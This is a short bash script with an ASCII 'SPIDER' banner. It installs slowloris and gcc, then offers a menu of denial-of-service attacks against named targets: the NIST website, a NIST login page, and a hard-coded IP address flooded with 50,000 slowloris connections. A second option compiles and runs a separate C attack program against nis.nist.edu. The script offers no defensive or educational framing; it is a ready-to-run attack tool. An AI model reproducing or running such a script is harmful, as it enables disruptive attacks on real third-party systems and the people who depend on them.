#!/bin/bash

echo"  ██████  ██▓███   ██▓▓█████▄ ▓█████  ██▀███     "
echo"▒██    ▒ ▓██░  ██▒▓██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒   "
echo"░ ▓██▄   ▓██░ ██▓▒▒██▒░██   █▌▒███   ▓██ ░▄█ ▒   "
echo"  ▒   ██▒▒██▄█▓▒ ▒░██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄     "
echo"▒██████▒▒▒██▒ ░  ░░██░░▒████▓ ░▒████▒░██▓ ▒██▒   "
echo"▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▓   ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░   "
echo"░ ░▒  ░ ░░▒ ░      ▒ ░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░   "
echo"░  ░  ░  ░░        ▒ ░ ░ ░  ░    ░     ░░   ░    "
echo"     ░            ░     ░       ░  ░   ░         "
echo"                       ░                         "


# Install slowloris
sudo apt install -y slowloris

# Install gcc
sudo apt install -y gcc

# Prompt the user to choose an option
echo "CHOOSE ONE"
echo "1:: DOS-ATTACK ON LOGIN PAGE #NIS.NIST.EDU"
echo "2:: DOS-ATTACK ON NIST WEBSITE #NIST.EDU"
read -p "Enter your choice (1 or 2): " num

# Execute the corresponding action based on user choice
if [ "$num" -eq 1 ]; then
    echo "OK WAIT FOR 2 SECONDS"
    slowloris -s 50000 -p 80 65.20.87.3
elif [ "$num" -eq 2 ]; then
    # Assuming you have a C file named nist_hack_by_spider.c
    gcc -Wall -pthread -o spider nist_hack_by_spider.c
    chmod +x spider
    ./spider nis.nist.edu
else
    echo "Invalid choice. Please run the script again and choose either 1 or 2."
fi

# Thank you message
echo "(THANK YOU FOR USING MY SOFTWARE)"
